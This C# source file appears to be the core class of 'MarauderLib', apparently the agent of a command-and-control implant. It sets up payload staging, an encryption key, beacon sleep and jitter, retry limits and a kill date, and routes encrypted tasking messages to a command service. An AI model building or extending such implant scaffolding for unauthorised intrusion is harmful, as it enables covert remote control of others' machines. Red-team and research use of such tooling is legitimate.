using System;

using MarauderLib.Objects;
using MarauderLib.Services;

namespace MarauderLib
{
    public static class Marauder
    {
        internal static event EventHandler<MessageRecievedArgs> OnMessageReceived;  
        public static string Id => State.Id;
        public static string PayloadName => State.PayloadName;
        public static string StagingId => State.StagingId;
        public static string Key => State.Key;    
        public static int Sleep => State.Sleep;
        public static double Jitter => State.Jitter;
        public static int MaxAttempts => State.MaxAttempts;
        public static bool Debug => State.Debug;
        public static DateTime? ExpirationDate => State.ExpirationDate;

        public static void Init(string payloadName, string key, int sleep, double jitter, int maxAttempts, 
            DateTime? expirationDate = null, Boolean debug = false)
        {
            State.PayloadName = payloadName;
            State.Key = key;
            State.Sleep = sleep;
            State.Jitter = jitter;
            State.MaxAttempts = maxAttempts;
            
            if (expirationDate.HasValue)
            {
                State.ExpirationDate = expirationDate;
            }

            State.Debug = debug;
            State.CryptoService = new CryptoService();
            State.CommandService = new CommandService();
        }

        public static string Stage()
        {
            return State.CryptoService.CreateStagingMessage();
        }
        
        public static void Process(string message)
        {
            OnMessageReceived?.Invoke("Marauder", new MessageRecievedArgs(message));
        }

        public static string GetResults()
        {
            return State.CryptoService.CreateAgentMessage();
        }
    }
}